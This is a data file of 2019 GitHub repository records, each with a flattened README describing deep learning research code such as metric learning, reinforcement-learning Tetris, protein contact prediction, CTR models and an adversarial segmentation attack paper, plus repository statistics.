pierre-jacob,ICCV2019-Horde,n/a,ICCV 2019 High Order Regularizer for Deep Embeddings HORDE This is the code repository for our ICCV 2019 paper Metric Learning with HORDE High Order Regularizer for Deep Embedding https arxiv org pdf 1908 02735 pdf misc hordearchitecture png Requirements Python version 3 5 and higher Python packages from requirements txt One of the used datasets CUB http www vision caltech edu visipedia CUB 200 2011 html CARS https ai stanford edu jkrause cars cardataset html Stanford Online Products http cvgl stanford edu projects liftedstruct or In Shop Clothes Retrieval http mmlab ie cuhk edu hk projects DeepFashion InShopRetrieval html Prepare the data and the pretrained models The datasets should simply be extracted and put in some folder You need to adapt the config ini file according to your installation dataset locations temporary path etc You also need one of the pre trained backbones GoogleNet https drive google com file d 1eQwAgaLeQl7DvPm0okKVdpBlYj0Wpz view usp sharing BN Inception https drive google com file d 1eqId67njyNaTe3G2mqjb2fWtGE5XotY view usp sharing These files must be placed in the data folder You can adjust the training parameters from config json config json epoch steps per epoch image size learning rate etc Installation pip install r requirements txt Usage Before running the default script you must adjust config ini config ini according to your installation and config json config json files for training parameters With default parameters in config json config json the default script should give results around 60 0 Recall 1 on the Cub 200 2011 dataset sh runcub sh To train a specific configuration see the parameter help python3 train py help Contact For any questions please feel free to reach pierre jacob ensea fr Compatibility support As of now September 6th 2019 the code supports 1 9 0 version Tensorflow for GPU usage and has not been tested with recent ones For CPU usage it still works with recent Tensorflow versions tested with 1 14 0 Citation If you use this method or this code in your research please cite as Pierre Jacob David Picard Aymeric Histace Edouard Klein Metric Learning With HORDE High Order Regularizer for Deep Embeddings In The IEEE International Conference on Computer Vision ICCV October 2019 InProceedingsJACOB2019ICCV title Metric Learning With HORDE High Order Regularizer for Deep Embeddings author Jacob Pierre and Picard David and Histace Aymeric and Klein Edouard booktitle The IEEE International Conference on Computer Vision ICCV month Oct year 2019 License MIT License Copyright c 2019 Pierre Jacob Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the Software to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE,2019-07-24T16:54:55Z,2019-12-12T09:28:09Z,Python,pierre-jacob,User,10,51,4,2,master,pierre-jacob,1,0,0,1,0,1,1
nuno-faria,tetris-ai,deep-reinforcement-learning#game-ai#q-learning#tetris,tetris ai A bot that plays tetris https en wikipedia org wiki Tetris using deep reinforcement learning Demo First 10000 points after some training Demo First 10000 points demo gif How does it work Reinforcement Learning At first the agent will play random moves saving the states and the given reward in a limited queue replay memory At the end of each episode game the agent will train itself using a neural network with a random sample of the replay memory As more and more games are played the agent becomes smarter achieving higher and higher scores Since in reinforcement learning once an agent discovers a good path it will stick with it it was also considered an exploration variable that decreases over time so that the agent picks sometimes a random action instead of the one it considers the best This way it can discover new paths to achieve higher scores Training The training is based on the Q Learning algorithm https en wikipedia org wiki Q learning Instead of using just the current state and reward obtained to train the network it is used Q Learning that considers the transition from the current state to the future one to find out what is the best possible score of all the given states considering the future rewards i e the algorithm is not greedy This allows for the agent to take some moves that might not give an immediate reward so it can get a bigger one later on e g waiting to clear multiple lines instead of a single one The neural network will be updated with the given data considering a play with reward reward that moves from state to nextstate the latter having an expected value of Qnextstate found using the prediction from the neural network if not terminal state last round Qstate reward discount Qnextstate else Qstate reward Best Action Most of the deep Q Learning strategies used output a vector of values for a certain state Each position of the vector maps to some action ex left right and the position with the higher value is selected However the strategy implemented was slightly different For some round of Tetris the states for all the possible moves will be collected Each state will be inserted in the neural network to predict the score obtained The action whose state outputs the biggest value will be played Game State It was considered several attributes to train the network Since there were many after several tests a conclusion was reached that only the first four present were necessary to train Number of lines cleared Number of holes Bumpiness sum of the difference between heights of adjacent pairs of columns Total Height Max height Min height Max bumpiness Next piece Current piece Game Score Each block placed yields 1 point When clearing lines the given score is numberlinescleared 2 boardwidth Losing a game subtracts 1 point Implementation All the code was implemented using Python For the neural network it was used the framework Keras with Tensorflow as backend Internal Structure The agent is formed by a deep neural network with variable number of layers neurons per layer activation functions loss function optimizer etc By default it was chosen a neural network with 2 hidden layers 32 neurons each the activations ReLu for the inner layers and the Linear for the last one Mean Squared Error as the loss function Adam as the optimizer Epsilon exploration starting at 1 and ending at 0 when the number of episodes reaches 75 Discount at 0 95 significance given to the future rewards instead of the immediate ones Training For the training the replay queue had size 20000 with a random sample of 512 selected for training each episode using 1 epoch Requirements Tensorflow tensorflow gpu 1 14 0 CPU version can be used too Tensorboard tensorboard 1 14 0 Keras Keras 2 2 4 Opencv python opencv python 4 1 0 25 Numpy numpy 1 16 4 Pillow Pillow 5 4 1 Tqdm tqdm 4 31 1 Results For 2000 episodes with epsilon ending at 1500 the agent kept going for too long around episode 1460 so it had to be terminated Here is a chart with the maximum score every 50 episodes until episode 1450 results results svg Note Decreasing the epsilonendepisode could make the agent achieve better results in a smaller number of episodes Useful Links Deep Q Learning PythonProgramming https pythonprogramming net q learning reinforcement learning python tutorial Keon https keon io deep q learning Towards Data Science https towardsdatascience com self learning ai agents part ii deep q learning b5ac60c3f47 Tetris Code My Road https codemyroad wordpress com 2013 04 14 tetris ai the near perfect player uses evolutionary strategies,2019-07-23T16:08:20Z,2019-12-08T10:40:42Z,Python,nuno-faria,User,1,50,13,7,master,nuno-faria#nlinker,2,0,0,1,0,0,1
lochenchou,MOSNet,n/a,MOSNet Implementation of MOSNet Deep Learning based Objective Assessment for Voice Conversion https arxiv org abs 1904 08352 Dependency Linux Ubuntu 16 04 GPU GeForce RTX 2080 Ti Driver version 418 67 CUDA version 10 1 Python 3 5 tensorflow gpu 2 0 0 beta1 cudnn 7 6 0 scipy pandas matplotlib librosa Environment set up For example conda create n mosnet python 3 5 conda activate mosnet pip install r requirements txt conda install cudnn 7 6 0 Usage 1 cd data and run bash download sh to download the VCC2018 evaluation results and submitted speech downsample the submitted speech might take some times 2 Run python mosresultspreprocess py to prepare the evaluation results Run python bootsrapestimation py to do the bootstrap experiment for intrinsic MOS calculation 3 Run python utils py to extract wav to h5 4 Run python train py model CNN BLSTM to train a CNN BLSTM version of MOSNet CNN BLSTM or CNN BLSTM are supported in model py as described in paper 5 Run python test py to test on the pre trained weights with specified model and weight Note The experimental results showed in the paper were trained on Keras with tensorflow 1 4 1 backend However the implementation here is based on tf2 0 0b1 so the results might vary a little Additionally the architectures showed in the paper were meta architectures any replace CNN BLSTM with more fancy modules ResNet etc would improve the final results Tuning the hyper parameters might result in the same favour VCC2018 Database Results The model is trained on the large listening evaluation results released by the Voice Conversion Challenge 2018 The listening test results can be downloaded from here https datashare is ed ac uk handle 10283 3257 The databases and results submitted speech can be downloaded from here https datashare is ed ac uk handle 10283 3061,2019-07-03T07:17:28Z,2019-12-05T13:03:47Z,Python,lochenchou,User,4,44,8,23,master,lochenchou,1,0,0,1,1,0,0
tjddus9597,Beyond-Binary-Supervision-CVPR19,n/a,Deep Metric Learning Beyond Binary Supervision Official pytorch Implementation of Deep Metric Learning Beyond Binary Supervision https arxiv org abs 1904 09626 CVPR 2019 Citing this work If you find this work useful in your research please consider citing inproceedingskim2019deep title Deep Metric Learning Beyond Binary Supervision author Kim Sungyeon and Seo Minkyo and Laptev Ivan and Cho Minsu and Kwak Suha booktitle Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition pages 2288 2297 year 2019 Dependency Python 3 6 Pytorch 0 4 1 tqdm pip install tqdm scipy tensorboardX Prerequisites 1 Download pretrained human pose dataset with labels from here https drive google com file d 1KJw9wD1WEjproxuNQf2M9J3JamTt9WD view usp sharing 2 Extract the zip file into data Human Pose Retrieval Quick Start bash python main py help Train a embedding network of resnet34 d 128 using logratio loss with dense triplet sampling python main py loss logratio model resnet34 result name denseLogratio optimizer sgd lr 0 01 lr decay 1e 4 batch size 150 num NN 5 embedding size 128 sampling dense Train a embedding network of resnet34 d 128 using triplet loss margin 0 03 with dense triplet sampling python main py loss triplet is norm True model resnet34 result name denseTriplet optimizer sgd lr 0 01 lr decay 1e 4 batch size 150 num NN 5 embedding size 128 sampling dense Train a embedding network of resnet34 d 128 using triplet loss margin 0 2 with binary triplet sampling python main py loss triplet is norm True model resnet34 result name naiveTriplet optimizer sgd lr 0 01 lr decay 1e 4 batch size 150 embedding size 128 sampling naive,2019-07-31T07:19:10Z,2019-12-08T15:27:19Z,Python,tjddus9597,User,2,36,4,37,master,tjddus9597,1,0,0,1,1,0,0
PacktPublishing,Deep-Reinforcement-Learning-Hands-On-Second-Edition,n/a,Deep Reinforcement Learning Hands On Second Edition Deep Reinforcement Learning Hands On Second Edition published by Packt,2019-07-03T09:21:47Z,2019-12-12T10:12:14Z,Jupyter Notebook,PacktPublishing,Organization,5,34,16,243,master,Shmuma#kishorrit,2,0,0,0,2,0,0
zhykoties,TimeSeries,n/a,List of Implementations Currently the reimplementation of the DeepAR paper DeepAR Probabilistic Forecasting with Autoregressive Recurrent Networks https arxiv org abs 1704 04110 is available in PyTorch More papers will be coming soon Authors Yunkai Zhang University of California Santa Barbara Qiao Jiang Brown University Acknowledgement Professor Xifeng Yan s group at UC Santa Barbara Part of the work was done at WeWork To run 1 Install all dependencies listed in requirements txt Note that the model has only been tested in the versions shown in the text file 1 Download the dataset and preprocess the data bash python preprocesselect py 1 Start training bash python train py If you want to perform ancestral sampling bash python train py sampling If you do not want to do normalization during evaluation bash python train py relative metrics 1 Evaluate a set of saved model weights bash python evaluate py 1 Perform hyperparameter search bash python searchparams py Results The model is evaluated on the electricity dataset which contains the electricity consumption of 370 households from 2011 to 2014 Under hourly frequency we use the first week of September 2014 as the test set and all time steps prior to that as the train set Following the experiment design in DeepAR the window size is chosen to be 192 where the last 24 is the forecasting horizon History number of time steps since the beginning of each household month of the year day of the week and hour of the day are used as time covariates Notice that some households started at different times so we only use windows that contain non missing values Under Gaussian likelihood we use the Adam optimizer with early stopping to train the model for 20 epoches The same set of hyperparameters is used as outlined in the paper Weights with the best ND value is selected where ND 0 06349 RMSE 0 452 rou90 0 034 and rou50 0 063 Sample results on electricity The top 10 plots are sampled from the test set with the highest 10 ND values whereas the bottom 10 plots are sampled from the rest of the test set Sample results on electricity The top 10 plots are sampled from the test set with the highest 10 ND values whereas the bottom 10 plots are sampled from the rest of the test set experiments basemodel figures bestND png,2019-08-05T19:59:24Z,2019-12-15T03:15:29Z,Python,zhykoties,User,6,34,9,28,master,zhykoties,1,0,0,4,1,0,0
shekit,mirror-selfie,deep-learning#jupyter-notebook#keras#keras-tensorflow#tensorflow,Mirror Selfie Removing the phone from the notorious mirror selfie using deep learning Demo Video no phone gif Full Video https youtu be BXwDPqzWilI How to run The notebooks were created and run in Google colab A google colab runtime resets every 12 hours You can link it to your google drive to help with file persistence mirrorselfie ipynb detect masks and do inpainting based on your trained model traininginpainting ipynb train the inpainting model on your own dataset Code is based on the following work https github com matterport MaskRCNN https github com MathiasGruber PConv Keras,2019-06-27T17:09:05Z,2019-10-31T02:53:51Z,Jupyter Notebook,shekit,User,0,34,2,7,master,shekit,1,0,0,0,0,0,0
tchambon,DeepSentinel,n/a,DeepSentinel The goal of this repository is to give tools to use Deep Learning on Sentinel 2 satellite images A blog post has been written about the context Fighting Hunger through Open Satellite Data A New State of the Art for Land Use Classification https medium com omdena fighting hunger through open satellite data a new state of the art for land use classification f57f20b7294b This repository shows How to download Sentinel 2 images https github com tchambon DeepSentinel tree master Data 20Download using Google Earth Engine Python API How to get a new SOTA https github com tchambon DeepSentinel tree master EuroSAT 20pretraining july 2019 on EuroSAT dataset https arxiv org abs 1709 00029 using multispectral images The model has a 0 99 accuracy previous SOTA 0 9857 30 less error rate How to use the model pretrained on EuroSAT https github com tchambon DeepSentinel tree master Training for you own classification tasks How to process and visualize https github com tchambon DeepSentinel tree master Data 20Preprocessing multispectral images You can download the weights of the pretrained model https github com tchambon DeepSentinel tree master Weights 20of 20pretrained 20model,2019-07-18T09:01:25Z,2019-12-05T00:15:38Z,Jupyter Notebook,tchambon,User,3,33,13,5,master,tchambon,1,0,0,0,0,0,0
j3xugit,RaptorX-Contact,deep#folding#learning#protein,RaptorX Contact a software package for protein contact and distance prediction by deep residual neural network This package has source code of the deep convolutional residual neural network method initiated by me for protein contact distance prediction and distance based folding The code and documentation will be improved gradually Anaconda for Python 2 7 Theano and possibly BioPython shall be installed in order to use this package Mr Hung Nguyen has improved my code so that it works with Python 3 See his revision at https github com nd hung DL4DistancePrediction2 The package contains core code used to produce results in the following papers 1 Analysis of distance based protein structure prediction by deep learning in CASP13 PROTEINS 2019 2 Distance based protein folding powered by deep learning PNAS August 2019 A 2 page abstract also appeared at RECOMB2019 in April 2019 This paper describes in details that distance predicted by deep ResNet may result in much better folding than contacts predicted by the same deep ResNet 3 Protein threading using residue co variation and deep learning ISMB and Bioinformatics July 2018 The first paper shows how to extend deep learning to distance prediction and then apply it to greatly improve protein alignment threading 4 ComplexContact a web server for inter protein contact prediction using deep learning NAR May 2018 The first paper shows that deep ResNet trained on single chain proteins works well in predicting contacts between two interacting proteins 5 Analysis of deep learning methods for blind protein contact prediction in CASP12 PROTEINS March 2018 6 Folding Membrane Proteins by Deep Transfer Learning Cell Systems September 2017 The first paper shows in details that deep ResNet works well on membrane proteins even if trained without any membrane proteins 7 Accurate De Novo Prediction of Protein Contact Map by Ultra Deep Learning Model PLoS CB Jan 2017 An early version was first posted to bioRxiv and arXiv in September 2016 See https www biorxiv org content 10 1101 073239v8 and https arxiv org abs 1609 00680 This is the first paper showing that deep convolutional residual neural network may significantly improve protein contact prediction and that contacts predicted by deep ResNet may be used to fold large proteins without detectable homology in PDB In Discussion this paper also proposed distance prediction by deep ResNet as the next step There is also a video of my keynote talk at ISMB 3DSIG in the summer of 2019 at https www youtube com watch v qAm22TRtgOU about deep learning for protein structure prediction The testsets used in the PLoS CB paper and the multiple sequence alignment for the CASP13 hard targets are available at http raptorx uchicago edu download Two deep models are also available for download at the same site After login this site please check out 0README data4contactPrediction txt and 0README models4ContactDistancePrediction txt for the download of data and models Here are a list of input features needed for our deep models 1 primary sequence represented as a string of letters upper case 2 position specific scoring matrix represented as a L 20 matrix You may generate multiple sequence alignment by PSI BLAST HHblits Jackhmmer and then construct such a matrix To generate such a matrix from an HHM file generated by HHblits HHpred you may use the script LoadHHM py in the folder Common 3 predicted secondary structure confidence score represented as a L 3 matrix Please make sure that the order of Helix Beta and Loop is consistent with our example data You may determine our order by comparing the confidence scores We used DeepCNFSSCon at https github com realbigws PredictProperty tree master bin to predict secondary structure 4 predicted solvent accessibility score represented as a L 3 matrix Again please make sure that the order of the three labels is consistent with our example data We used AcconPred at https github com realbigws PredictProperty tree master bin to predict solvent accessibility 5 normalized CCMpred matrix L L i e the original CCMpred output matrix normalized by its mean and standard deviation We used option R d GPU to run CCMpred where GPU is the ID of GPU e g 1 on your machine 6 three other 2D matrices each has shape L L for pairwsie relationship generated by alnstats in MetaPSICOV You may download the code at https github com psipred metapsicov blob master src alnstats c For a single protein its features are deposited as a Python dict Please check out our testdata for the dict keys and exact format The keys related to PSICOV and disorder information are not needed In addition protein name and sequence length are also needed in the dict although they are not used as input features The input features of all test proteins are saved as a list of dict and then packed as a cPickle file Contact Jinbo Xu jinboxu gmail com,2019-07-26T14:00:44Z,2019-12-15T00:55:46Z,Python,j3xugit,User,4,32,11,43,master,j3xugit,1,0,0,0,3,0,2
utkuozbulak,adaptive-segmentation-mask-attack,adversarial-examples#segmentation#u-net,Adaptive Segmentation Mask Attack This repository contains the implementation of the Adaptive Segmentation Mask Attack ASMA a targeted adversarial example generation method for deep learning segmentation models This attack was proposed in the paper Impact of Adversarial Examples on Deep Learning Models for Biomedical Image Segmentation by U Ozbulak et al and will be published in the 22nd International Conference on Medical Image Computing and Computer Assisted Intervention MICCAI 2019 Link to the paper https arxiv org abs 1907 13124 General Information This repository is organized as follows Code src folder contains necessary python files to perform the attack and calculate various stats i e correctness and modification Data data folder contains a couple of examples for testing purposes The data we used in this study can be taken from 1 Model Example model used in this repository can be downloaded from https www dropbox com s 6ziz7s070kkaexp eyepretrainedmodel pt helperfunctions py contains a function to load this file and main py contains an exaple that uses this model Frequently Asked Questions FAQ How can I run the demo 1 Download the model from https www dropbox com s 6ziz7s070kkaexp eyepretrainedmodel pt 2 Create a folder called model on the same level as data and src put the model under this model folder 3 Run main py Would this attack work in multi class segmentation models Yes given that you provide a proper target mask model etc Does the code require any modifications in order to make it work for multi class segmentation models No probably depending on your model input At least the attack itself adaptiveattack py should not require major modifications on its logic Citation If you find the code in this repository useful for your research consider citing our paper Also feel free to use any visuals available here inproceedingsozbulak2019impact title Impact of Adversarial Examples on Deep Learning Models for Biomedical Image Segmentation author Ozbulak Utku and Van Messem Arnout and De Neve Wesley booktitle International Conference on Medical Image Computing and Computer Assisted Intervention pages 300 308 year 2019 organization Springer Requirements python 3 5 torch 0 4 0 torchvision 0 1 9 numpy 1 13 0 PIL 1 1 7 References 1 Pena Betancor C Gonzalez Hernandez M Fumero Batista F Sigut J Medina Mesa E Alayon S Gonzalez M Estimation of the relative amount of hemoglobin in the cup and neuroretinal rim using stereoscopic color fundus images 2 Ronneberger O Fischer P Brox T U Net Convolutional networks for biomedical image segmentation,2019-06-28T16:27:34Z,2019-12-03T09:29:10Z,Python,utkuozbulak,User,1,32,2,27,master,utkuozbulak,1,0,0,0,0,0,0
GitHub-HongweiZhang,prediction-flow,attention#attention-mechanism#ctr#ctr-models#ctr-prediction#deep-learning#deepfm#deepinterestevolutionnetwork#deepinterestnetwork#deepneuralnetworks#dien#din#dnn#machine-learning#prediction-flow#pytorch#recommendation#torch#wide-and-deep,Build Status https travis ci org GitHub HongweiZhang prediction flow svg branch master https travis ci org GitHub HongweiZhang prediction flow PyPI version https badge fury io py prediction flow svg https badge fury io py prediction flow prediction flow prediction flow is a Python package providing modern Deep Learning based CTR models Models are implemented by PyTorch how to use Install using pip pip install prediction flow feature how to define feature There are two parameters for all feature types name and columnflow The name parameter is used to index the column raw data from input data frame The columnflow parameter is a single transformer of a list of transformers The transformer is used to pre process the column data before training the model dense number feature Number age StandardScaler Number ctr None sparse category feature Category movieId CategoryEncoder mincnt 1 var length sequence feature Sequence genres SequenceEncoder sep mincnt 1 transformer The following transformers are provided now transformer supported feature type detail StandardScaler Number Wrapper of scikit learn s StandardScaler Null value must be filled in advance LogTransformer Number Log scaler Null value must be filled in advance CategoryEncoder Category Converting str value to int Null value must be filled in advance using UNKNOWN SequenceEncoder Sequence Converting sequence str value to int Null value must be filled in advance using UNKNOWN model model reference DNN Wide Deep DLRS 2016 Wide Deep Learning for Recommender Systems https arxiv org pdf 1606 07792 pdf DeepFM IJCAI 2017 DeepFM A Factorization Machine based Neural Network for CTR Prediction http www ijcai org proceedings 2017 0239 pdf DIN KDD 2018 Deep Interest Network for Click Through Rate Prediction https arxiv org pdf 1706 06978 pdf DNN GRU GRU Attention AAAI 2019 Deep Interest Evolution Network for Click Through Rate Prediction https arxiv org pdf 1809 03672 pdf DNN GRU AIGRU AAAI 2019 Deep Interest Evolution Network for Click Through Rate Prediction https arxiv org pdf 1809 03672 pdf DNN GRU AGRU AAAI 2019 Deep Interest Evolution Network for Click Through Rate Prediction https arxiv org pdf 1809 03672 pdf DNN GRU AUGRU AAAI 2019 Deep Interest Evolution Network for Click Through Rate Prediction https arxiv org pdf 1809 03672 pdf DIEN AAAI 2019 Deep Interest Evolution Network for Click Through Rate Prediction https arxiv org pdf 1809 03672 pdf OTHER TODO example movielens 1M This dataset is just used to test the code can run accuracy does not make sense Prepare the dataset preprocess ipynb examples movielens ml 1m preprocess ipynb Run the model movielens 1m ipynb examples movielens movielens 1m ipynb amazon Prepare the dataset prepareneg ipynb examples amazon prepareneg ipynb Run the model amazon ipynb examples amazon amazon ipynb An example using pytorch lightning https github com williamFalcon pytorch lightning amazon lightning ipynb examples amazon amazon lightning ipynb accuracy benchmark examples amazon simplebenchmark png acknowledge and reference Referring the design from DeepCTR https github com shenweichen DeepCTR the features are divided into dense class Number sparse class Category sequence class Sequence types,2019-08-01T03:39:04Z,2019-11-28T15:36:42Z,Python,GitHub-HongweiZhang,User,4,30,11,24,master,GitHub-HongweiZhang,1,0,0,1,5,0,17
muellerzr,Practical-Deep-Learning-For-Coders,n/a,Practical Deep Learning for Coders Material for my Proctor of Fast AI s course This course is originally done by Jeremy Howard and Rachel Thomas and is taught at the University by course alumni The course can be found here https course fast ai The Fast AI forums can be found at https forums fast ai,2019-06-25T04:08:13Z,2019-12-13T00:44:41Z,Jupyter Notebook,muellerzr,User,1,26,3,72,master,muellerzr#JChamblee99,2,0,0,0,0,0,4
NERSC,dl4sci-tf-tutorials,n/a,DL4Sci School TensorFlow tutorials This repository contains the hands on introductory deep learning tutorial examples for the Deep Learning for Science school at Berkeley Lab https dl4sci school lbl gov These jupyter notebooks come from the official TensorFlow 2 0 tutorials at https www tensorflow org beta We made minor updates so attendees could run them on Cori GPU without modification Contents Setup on Cori GPU https github com NERSC dl4sci tf tutorials getting setup on cori gpu Setup on Collab https github com NERSC dl4sci tf tutorials running on collab Introductory examples https github com NERSC dl4sci tf tutorials introductory hands on notebooks Advanced examples https github com NERSC dl4sci tf tutorials optional advanced notebooks Getting setup on Cori GPU Open https jupyter dl nersc gov and log in with your training account credentials Start a terminal by scrolling to the bottom of the Launcher window and clicking the Terminal button under Other Using the terminal clone this repository to download all of the tutorial notebooks git clone https github com NERSC dl4sci tf tutorials git Now you can use the Jupyter file browser to navigate the repository and launch notebooks You can test that things are working on a Cori GPU node by running the Test ipynb Test ipynb notebook Running on Collab If you have issues with Cori GPU or if you simply prefer you can run these examples in the cloud on Google s Collab service Simply go to the TF webpage for the specific example links below and click Run in Google Collab Note that you may not get access to a GPU on Collab but the TF tutorials are designed to execute quickly regardless Introductory hands on notebooks For a good introduction to implementing models in TensorFlow using the recommended Keras API we recommend working through at least the first few examples below The overfitting underfitting and save restore examples also demonstrate very practical use cases that you may want to work through Finally depending on time you can also try out the advanced examples according to your preference For each example see if you can successfully modify the code and take note of how results change Basic classification basicclassification ipynb basicclassification ipynb https www tensorflow org beta tutorials keras basicclassification Quiz questions 1 Why did we divide the image data by 255 2 Which activation function did we use for our hidden layer of the network Could we have used a different one 3 Which activation function did we use for the output layer of the network Could we have used a different one Challenges 1 Try to modify the network architecture by adding removing layers changing the size of the layers etc 2 Try changing the optimizer algorithm can you figure out how to modify the default learning rate 3 See if you can improve the test set accuracy How good of a model can you train Convolutional neural networks introtocnns ipynb introtocnns ipynb https www tensorflow org beta tutorials images introtocnns This example is similar to the previous one but demonstrates how to setup CNNs so is valuable to work through as well Quiz questons 1 What benefit do we get from using max pooling in our network 2 Why do we add the dense layers only at the end 3 Does the model converge with the specified settings Challenges 1 Try to modify the network architecture the number of layers the number of filters in the layers the sizes of the filters etc 2 What s the best test accuracy you can achieve 3 See if you can add data augmentation like the examples here https keras io preprocessing image 4 Try to add BatchNormalization to the model https www tensorflow org versions r2 0 apidocs python tf keras layers BatchNormalization Classify structured data featurecolumns ipynb featurecolumns ipynb https www tensorflow org beta tutorials keras featurecolumns Quiz questions 1 This tutorial is just meant to teach you some mechanics and doesn t give an impressive result What are some of the reasons why this model under performs 2 What are the situations in which you should consider using embedding or hashed feature columns Can you think of a good use case for bucketized features Overfitting and underfitting overfitandunderfit ipynb overfitandunderfit ipynb https www tensorflow org beta tutorials keras overfitandunderfit Quiz questions 1 Try to summarize how you diagnose under and overfitting 2 If your model is overfitting what is the most ideal way to improve it 3 How can you fix under fitting Challenge 1 All the models in this example are overfitting Can you build a model that underfits Saving and restoring models saveandrestoremodels ipynb saveandrestoremodels ipynb https www tensorflow org beta tutorials keras saveandrestoremodels Optional advanced notebooks Defining custom layers customlayers ipynb customlayers ipynb https www tensorflow org beta tutorials eager customlayers Loading and preprocessing images images ipynb images ipynb https www tensorflow org beta tutorials loaddata images Deep Convolutional Generative Adversarial Networks DCGAN dcgan ipynb dcgan ipynb https www tensorflow org beta tutorials generative dcgan Variational auto encoders VAE cvae ipynb cvae ipynb https www tensorflow org beta tutorials generative cvae Image to image translation with CycleGAN cyclegan ipynb cyclegan ipynb https www tensorflow org beta tutorials generative cyclegan Note I didn t have time to install tensorflow examples so this is done in the notebook You will have to restart the kernel after running the pip install cell to pick up the new library Transformers for language understanding transformer ipynb transformer ipynb https www tensorflow org beta tutorials text transformer Image captioning imagecaptioning ipynb imagecaptioning ipynb https www tensorflow org beta tutorials text imagecaptioning This example takes quite a while to run It uses a fairly slow feature caching method and the model training has poor GPU utilization and takes a while TensorBoard If you d like to try TensorBoard in Jupyter you can take a look at the example code in testtensorboard ipynb testtensorboard ipynb See if you can get TensorBoard working with one of the example notebooks,2019-07-10T22:42:26Z,2019-12-11T06:59:34Z,Jupyter Notebook,NERSC,Organization,2,26,5,28,master,sparticlesteve#MustafaMustafa,2,0,0,0,0,0,0
Bala93,Multi-task-deep-network,n/a,Multi task deep network Multi task deep learning based approaches for semantic segmentation in medical images Psi Net Shape and boundary aware joint multi task deep network for medical image segmentation https arxiv org abs 1902 04099 EMBC 2019 Psi Net Architecture appendix PSINet jpg Conv MCD A Plug and Play Multi task Module for Medical Image Segmentation https arxiv org abs 1908 05311 MICCAIW MLMI 2019 Conv MCD Architecture appendix Conv MCD png Dependencies Packages PyTorch TensorboardX OpenCV numpy tqdm An exhaustive list of packages used could be found in the requirements txt file Install the same using the following command bash conda create name file requirements txt Preprocessing Contour and Distance Maps are pre computed Code to be added Directory Structure Train and Test folders should contain the following structure contour 1 png 2 png distcontour 1 mat 2 mat distmask 1 mat 2 mat distsigned 1 mat 2 mat image 1 jpg 2 jpg mask 1 png 2 png Sample Results Train code UNET bash basepath trainpath basepath train image valpath basepath test image modeltype unet objecttype polyp savepath basepath models python train py trainpath trainpath valpath valpath modeltype modeltype objecttype objecttype savepath savepath DCAN bash basepath trainpath basepath train image valpath basepath test image modeltype convmcd objecttype dcan savepath basepath models python train py trainpath trainpath valpath valpath modeltype modeltype objecttype objecttype savepath savepath DMTN bash basepath trainpath basepath train image valpath basepath test image modeltype dmtn objecttype polyp savepath basepath models python train py trainpath trainpath valpath valpath modeltype modeltype objecttype objecttype savepath savepath Psi Net bash basepath trainpath basepath train image valpath basepath test image modeltype psinet objecttype polyp savepath basepath models python train py trainpath trainpath valpath valpath modeltype modeltype objecttype objecttype savepath savepath Conv MCD bash basepath trainpath basepath train image valpath basepath test image modeltype convmcd objecttype polyp savepath basepath models python train py trainpath trainpath valpath valpath modeltype modeltype objecttype objecttype savepath savepath Citations If you use the Conv MCD or Psi Net code in your research please consider citing the respective paper articleMurugesan2019PsiNetSA title Psi Net Shape and boundary aware joint multi task deep network for medical image segmentation author Balamurali Murugesan and Kaushik Sarveswaran and Sharath M Shankaranarayana and Keerthi Ram and Mohanasankar Sivaprakasam journal ArXiv year 2019 volume abs 1902 04099 miscmurugesan2019convmcd title Conv MCD A Plug and Play Multi task Module for Medical Image Segmentation author Balamurali Murugesan and Kaushik Sarveswaran and Sharath M Shankaranarayana and Keerthi Ram and Jayaraj Joseph and Mohanasankar Sivaprakasam year 2019 eprint 1908 05311 archivePrefix arXiv primaryClass cs CV,2019-07-25T07:04:14Z,2019-11-25T05:49:02Z,Python,Bala93,User,3,25,3,27,master,Bala93#KaushikSarveswaran,2,0,0,2,1,0,0
PouyaREZ,AirBnbPricePrediction,airbnb#machine-learning#neural-network#newyork-data#python#sentiment-analysis,CS229 Final Project Authors Pouya Rezazadeh Kalehbasti pouyar stanford edu Liubov Nikolenko liubov stanford edu Hoormazd Rezaei hoormazd stanford edu Link to source paper for citation https arxiv org abs 1907 12665 In order to run the code make sure you pre instal all the dependecies such as TextBlob and sklearn INITIAL DATA PREPROCESSING 1 Generate a fine with review sentiment python sentimentanalysis py 2 Clean the data python datacleanup py 3 Normalize and split the data datapreprocessingreviews py GENERATE THE FEATURE SELECTION NPY FILE 1 For P value feature selection python featureselection py 2 For Lasso CV python cv py TRAIN AND RUN THE MODELS python runmodels py Note that by commenting uncommenting certain lines of code you will be able to run different configurations of the models 1 To run the models with Lasso CV feature selection comment out line 240 coeffs np load Data selectedcoefspvals npy and uncomment line 241 coeffs np load Data selectedcoefs npy 2 To run the models with p value feature selection uncomment line 240 coeffs np load Data selectedcoefspvals npy and comment out line 241 coeffs np load Data selectedcoefs npy 3 To run the baseline uncomment the lines 277 278 print Linear Regression LinearModel Xconcat yconcat Xtest ytest and comment out everything below these lines Also comment out the lines 268 269 and 270 Xtrain Xtrain list colset Xval Xval list colset Xtest Xtest list colset Warning certain models take a while to train and run,2019-07-27T22:52:58Z,2019-11-27T04:26:03Z,Python,PouyaREZ,User,3,25,5,13,master,PouyaREZ,1,0,0,0,0,0,0
ShannonAI,Is-Word-Segmentation-Necessary,n/a,Is Word Segmentation Necessary Code for ACL 2019 Is Word Segmentation Necessary for Deep Learning of Chinese Representations,2019-07-18T03:47:15Z,2019-12-11T02:23:44Z,n/a,ShannonAI,Organization,6,24,2,1,master,jiweil,1,0,0,0,2,0,0
